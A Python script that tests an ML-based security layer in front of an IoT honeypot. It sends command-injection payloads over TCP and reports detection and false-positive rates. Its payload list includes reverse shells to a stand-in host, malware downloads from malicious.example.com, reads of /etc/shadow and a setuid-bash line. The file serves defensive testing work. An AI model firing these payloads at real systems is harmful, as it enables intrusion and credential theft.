# ml_command_injection_test.py
import socket
import time
import argparse
import random
import string
import json
from colorama import init, Fore, Style

# Initialize colorama for colored output
init()

# Common command injection payloads
INJECTION_PAYLOADS = [
    # Basic command separators
    "; ls -la", "& ls -la", "| ls -la", "$(ls -la)", "`ls -la`",
    # Data exfiltration attempts
    "; cat /etc/passwd", "& cat /etc/shadow", "| cat /proc/cpuinfo",
    # Network scanning
    "; ping -c 1 8.8.8.8", "& ifconfig", "| ip addr", 
    # Reverse shell attempts
    "; nc -e /bin/sh 198.51.100.1 4444", "| bash -i >& /dev/tcp/198.51.100.1/4444 0>&1",
    # IoT-specific commands
    "; cat /proc/device-tree/model", "& cat /proc/version", "| grep -r password /etc",
    # Malware download attempts
    "; wget http://malicious.example.com/malware.sh", "& curl -O http://malicious.example.com/malware.sh",
    # Advanced evasion techniques
    "; s${RANDOM}l${RANDOM}e${RANDOM}e${RANDOM}p 5", "& p\$(printf '%s' i)ng 8.8.8.8",
    # Attempted privilege escalation
    "; sudo -l", "& su root", "| chmod u+s /bin/bash"
]

# Typical IoT device commands (legitimate)
LEGITIMATE_COMMANDS = [
    "help", "status", "version", "reboot", "info", "uptime", "temperature", 
    "logs", "network", "password", "update", "backup", "restore", "list devices"
]

# Normal log viewing commands (should not be flagged)
NORMAL_LOG_COMMANDS = [
    "view logs", 
    "show system logs",
    "get last 10 logs",
    "display error logs",
    "print recent logs",
    "check auth logs"
]

def format_success(message):
    return f"{Fore.GREEN}{message}{Style.RESET_ALL}"

def format_error(message):
    return f"{Fore.RED}{message}{Style.RESET_ALL}"

def format_warning(message):
    return f"{Fore.YELLOW}{message}{Style.RESET_ALL}"

def format_info(message):
    return f"{Fore.CYAN}{message}{Style.RESET_ALL}"

def format_payload(payload):
    return f"{Fore.MAGENTA}{payload}{Style.RESET_ALL}"

def format_ml(message):
    return f"{Fore.BLUE}[ML-FIRST] {message}{Style.RESET_ALL}"

def format_normal(message):
    return f"{Fore.GREEN}[NORMAL] {message}{Style.RESET_ALL}"

def is_ml_rejection(response):
    """Check if the response indicates rejection by the ML-first layer"""
    ml_indicators = [
        "suspicious activity", "blacklisted", "too many connections",
        "ml detection", "threat detected", "access denied"
    ]
    
    lower_response = response.lower()
    for indicator in ml_indicators:
        if indicator in lower_response:
            return True
    return False

def try_command_injection(host, port, payload, include_auth=True, delay=1.0, is_normal=False):
    """Attempt a command injection attack with the given payload"""
    if is_normal:
        print(f"Trying normal log command: {format_normal(payload)}")
    else:
        print(f"Trying payload: {format_payload(payload)}")
    
    result_data = {
        "payload": payload,
        "timestamp": time.time(),
        "success": False,
        "result": "",
        "ml_detected": False,
        "response": "",
        "is_normal": is_normal
    }
    
    try:
        # Create a socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        
        # Connect to the honeypot
        s.connect((host, port))
        
        # Receive welcome message
        data = s.recv(4096)
        response = data.decode('utf-8', errors='ignore')
        print(f"{format_info('Server:')} {response.strip()}")
        result_data["response"] = response.strip()
        
        # Check if ML immediately rejected the connection
        if is_ml_rejection(response):
            if is_normal:
                print(format_warning("Normal command incorrectly rejected by ML-First security layer"))
                result_data["result"] = "FALSE_POSITIVE"
            else:
                print(format_ml("Connection rejected by ML-First security layer"))
            
            result_data["ml_detected"] = True
            result_data["result"] = "ML_REJECTED"
            s.close()
            return False, "ML_REJECTED", result_data
        
        # If requested, attempt authentication (legitimate step)
        if include_auth:
            # For normal commands, always use valid username
            if is_normal:
                username = "admin"
            # Otherwise sometimes we'll try a valid one, sometimes invalid
            elif random.random() < 0.7:  # 70% chance of using a valid username
                username = "admin"
            else:
                username = f"user_{random.randint(1000, 9999)}"
                
            print(f"{format_info('Sending username:')} {username}")
            s.sendall(f"{username}\n".encode())
            time.sleep(delay)
            
            # Receive response
            try:
                data = s.recv(4096)
                response = data.decode('utf-8', errors='ignore')
                print(f"{format_info('Server:')} {response.strip()}")
                result_data["response"] += "\n" + response.strip()
                
                # Check if ML rejected after auth attempt
                if is_ml_rejection(response):
                    if is_normal:
                        print(format_warning("Normal command auth incorrectly rejected by ML-First security layer"))
                        result_data["result"] = "FALSE_POSITIVE"
                    else:
                        print(format_ml("Authentication rejected by ML-First security layer"))
                    
                    result_data["ml_detected"] = True
                    result_data["result"] = "ML_REJECTED_AUTH"
                    s.close()
                    return False, "ML_REJECTED_AUTH", result_data
                
            except socket.timeout:
                print(format_error("Timeout waiting for server response after username"))
                result_data["result"] = "TIMEOUT"
                s.close()
                return False, "TIMEOUT", result_data
            
            # For authentication systems, we might need to send a password
            if "password" in response.lower():
                # Use the correct password for normal commands
                password = "secure_iot_2025" if is_normal else "wrong_password"
                print(f"{format_info('Sending password:')} {'*****' if is_normal else password}")
                s.sendall(f"{password}\n".encode())
                time.sleep(delay)
                
                # Receive response after password
                try:
                    data = s.recv(4096)
                    response = data.decode('utf-8', errors='ignore')
                    print(f"{format_info('Server:')} {response.strip()}")
                    result_data["response"] += "\n" + response.strip()
                except socket.timeout:
                    print(format_error("Timeout waiting for server response after password"))
                    result_data["result"] = "TIMEOUT"
                    s.close()
                    return False, "TIMEOUT", result_data
        
        # Send the command with injection payload
        print(f"{format_info('Sending command:')} {payload}")
        s.sendall(f"{payload}\n".encode())
        time.sleep(delay)
        
        # Receive response
        try:
            data = s.recv(4096)
            response = data.decode('utf-8', errors='ignore')
            print(f"{format_info('Server:')} {response.strip()}")
            result_data["response"] += "\n" + response.strip()
            
            # Check if ML detected the command as malicious
            if is_ml_rejection(response):
                if is_normal:
                    print(format_warning("Normal log command incorrectly rejected by ML-First security layer"))
                    result_data["result"] = "FALSE_POSITIVE"
                else:
                    print(format_ml("Command rejected by ML-First security layer"))
                
                result_data["ml_detected"] = True
                result_data["result"] = "ML_REJECTED_COMMAND"
                s.close()
                return True, "ML_REJECTED_COMMAND", result_data
            
            # For normal commands, check if they were processed correctly
            if is_normal:
                print(format_normal("Normal log command correctly processed"))
                result_data["success"] = True
                result_data["result"] = "NORMAL_SUCCESS"
            # Otherwise check for signs of successful injection or detection
            elif "command not found" in response.lower() or "syntax error" in response.lower():
                print(format_success("Possible vulnerability! Server appears to be processing commands!"))
                result_data["success"] = True
                result_data["result"] = "POTENTIAL_VULN"
            elif "illegal" in response.lower() or "invalid" in response.lower() or "error" in response.lower():
                print(format_warning("Command rejected but server is responsive"))
                result_data["result"] = "REJECTED_COMMAND"
            else:
                print(format_info("Ambiguous response received"))
                result_data["result"] = "UNKNOWN"
                
        except socket.timeout:
            print(format_warning("Timeout waiting for server response after payload"))
            result_data["result"] = "TIMEOUT"
        
        # Close the socket
        s.close()
        return True, result_data["result"], result_data
        
    except Exception as e:
        print(format_error(f"Error: {str(e)}"))
        result_data["result"] = f"ERROR: {str(e)}"
        return False, result_data["result"], result_data

def run_attack_series(host, port, num_attacks=10, delay=1.0, include_auth=True, mix_legitimate=False, save_results=False):
    """Run a series of command injection attacks"""
    results = {
        "ML_REJECTED": 0,
        "ML_REJECTED_AUTH": 0,
        "ML_REJECTED_COMMAND": 0,
        "REJECTED_COMMAND": 0,
        "POTENTIAL_VULN": 0,
        "TIMEOUT": 0,
        "UNKNOWN": 0,
        "ERROR": 0,
        "NORMAL_SUCCESS": 0,
        "FALSE_POSITIVE": 0
    }
    
    all_results = []
    
    print(f"\n{format_info('='*60)}")
    print(f"{format_info('ML-FIRST ARCHITECTURE COMMAND INJECTION TEST')}")
    print(f"{format_info('='*60)}")
    print(f"Target: {host}:{port}")
    print(f"Number of attacks: {num_attacks}")
    print(f"Authentication: {'Enabled' if include_auth else 'Disabled'}")
    print(f"Mix with legitimate commands: {'Yes' if mix_legitimate else 'No'}")
    print(f"Including normal log commands (should not be flagged)")
    print(f"{format_info('='*60)}\n")
    
    # Start with normal log commands (2 attempts)
    for i in range(2):
        print(f"\n{format_normal('Normal Log Command')} #{i+1}")
        print("-" * 30)
        
        # Choose a random normal log command
        payload = NORMAL_LOG_COMMANDS[i % len(NORMAL_LOG_COMMANDS)]
        
        # Try the normal command
        _, result, result_data = try_command_injection(
            host, port, payload, include_auth, delay, is_normal=True
        )
        
        # Update stats
        if result in results:
            results[result] += 1
        elif result.startswith("ERROR"):
            results["ERROR"] += 1
            
        # Record detailed result data
        all_results.append(result_data)
        
        # Small delay between commands
        time.sleep(1.0)
    
    # Then run the attack series
    for i in range(num_attacks):
        print(f"\n{format_info('Attack')} #{i+1}")
        print("-" * 30)
        
        # Sometimes use a legitimate command if mixing is enabled
        if mix_legitimate and random.random() < 0.3:  # 30% chance of legitimate command
            payload = random.choice(LEGITIMATE_COMMANDS)
            print(f"Using legitimate command: {format_info(payload)}")
        else:
            # Choose a random injection payload
            payload = random.choice(INJECTION_PAYLOADS)
        
        # Try the injection
        _, result, result_data = try_command_injection(
            host, port, payload, include_auth, delay, is_normal=False
        )
        
        # Update stats
        if result in results:
            results[result] += 1
        elif result.startswith("ERROR"):
            results["ERROR"] += 1
            
        # Record detailed result data
        all_results.append(result_data)
        
        # Small delay between attacks
        if i < num_attacks - 1:
            time.sleep(1.0)
    
    # Calculate ML effectiveness
    total_attacks = num_attacks
    total_ml_detections = results["ML_REJECTED"] + results["ML_REJECTED_AUTH"] + results["ML_REJECTED_COMMAND"]
    false_negatives = total_attacks - total_ml_detections - results["ERROR"] - results["TIMEOUT"]
    false_positives = results["FALSE_POSITIVE"]
    normal_success = results["NORMAL_SUCCESS"]
    
    ml_detection_rate = (total_ml_detections / total_attacks * 100) if total_attacks > 0 else 0
    false_positive_rate = (false_positives / (false_positives + normal_success) * 100) if (false_positives + normal_success) > 0 else 0
    
    # Print summary
    print(f"\n{format_info('='*60)}")
    print(f"{format_info('ML-FIRST ARCHITECTURE TEST RESULTS')}")
    print(f"{format_info('='*60)}")
    print(f"Total attacks attempted: {num_attacks}")
    print(f"Normal log commands tested: 2")
    
    print(f"\nML-First Layer Performance:")
    print(f"  Initial connections rejected by ML: {results['ML_REJECTED']}")
    print(f"  Auth attempts rejected by ML: {results['ML_REJECTED_AUTH']}")
    print(f"  Commands rejected by ML: {results['ML_REJECTED_COMMAND']}")
    print(f"  Total ML-based rejections: {total_ml_detections}")
    print(f"  ML detection rate: {ml_detection_rate:.2f}%")
    print(f"  False positives (normal logs flagged): {false_positives}")
    print(f"  False positive rate: {false_positive_rate:.2f}%")
    
    print(f"\nNormal Log Commands:")
    print(f"  Successfully processed: {normal_success}")
    print(f"  Incorrectly flagged: {false_positives}")
    
    print(f"\nOther Results:")
    print(f"  Command rejected by honeypot: {results['REJECTED_COMMAND']}")
    print(f"  Potential vulnerabilities found: {results['POTENTIAL_VULN']}")
    print(f"  Unknown results: {results['UNKNOWN']}")
    print(f"  Timeouts: {results['TIMEOUT']}")
    print(f"  Errors: {results['ERROR']}")
    print(f"{format_info('='*60)}")
    
    # Save results to JSON file if requested
    if save_results:
        try:
            filename = f"ml_cmd_injection_results_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump({
                    "summary": results,
                    "ml_detection_rate": ml_detection_rate,
                    "false_positive_rate": false_positive_rate,
                    "test_parameters": {
                        "host": host,
                        "port": port,
                        "num_attacks": num_attacks,
                        "normal_commands": 2,
                        "include_auth": include_auth,
                        "mix_legitimate": mix_legitimate
                    },
                    "detailed_results": all_results
                }, f, indent=2)
            print(f"\nDetailed results saved to {filename}")
        except Exception as e:
            print(f"\nError saving results: {e}")

def main():
    parser = argparse.ArgumentParser(description="ML-First Architecture Command Injection Test")
    parser.add_argument("host", nargs="?", default="localhost", help="Target host")
    parser.add_argument("port", nargs="?", type=int, default=8080, help="Target port (ML proxy)")
    parser.add_argument("-n", "--num-attacks", type=int, default=10, help="Number of attacks to attempt")
    parser.add_argument("-d", "--delay", type=float, default=0.5, help="Delay between commands (seconds)")
    parser.add_argument("--no-auth", action="store_true", help="Skip authentication step")
    parser.add_argument("--mixed", action="store_true", help="Mix in some legitimate commands")
    parser.add_argument("--save", action="store_true", help="Save detailed results to JSON file")
    
    args = parser.parse_args()
    
    run_attack_series(
        args.host, 
        args.port, 
        num_attacks=args.num_attacks,
        delay=args.delay,
        include_auth=not args.no_auth,
        mix_legitimate=args.mixed,
        save_results=args.save
    )

if __name__ == "__main__":
    main() 